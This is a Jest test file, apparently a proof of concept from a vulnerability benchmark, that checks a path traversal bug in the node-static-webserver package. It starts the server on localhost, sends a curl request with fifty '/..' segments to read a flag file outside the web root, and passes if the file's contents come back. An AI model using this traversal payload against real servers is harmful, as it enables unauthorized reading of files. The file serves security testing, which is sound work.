const path = require('path');
const pathToFlag = path.resolve(__dirname, '../flag.html');
const genstr = function (n) {
    const v98 = '/..'.repeat(50);
    const v99 = v98 + pathToFlag;
    return v99;
};
const v112 = done => {
    const v100 = expect.assertions(1);
    v100;
    const pkg = require('node-static-webserver');
    const fs = require('fs');
    const v101 = require('child_process');
    const exec = v101.exec;
    const v102 = fs.readFileSync(pathToFlag);
    let hostsFile = v102.toString();
    const a = require('child_process');
    try {
        const v103 = () => {
        };
        const v104 = a.execSync('fuser -k 8984/tcp', v103);
        v104;
    } catch (e) {
    }
    const v105 = new pkg(__dirname, 8984, '127.0.0.1');
    v105;
    const v106 = genstr();
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8984${ v106 }"`;
    const v110 = (error, stdout) => {
        const v107 = expect(stdout);
        const v108 = v107.toBe(hostsFile);
        v108;
        const v109 = done();
        v109;
    };
    const v111 = exec(attack_string, v110);
    v111;
};
const v113 = test('Path Traversal in node-static-webserver', v112);
v113;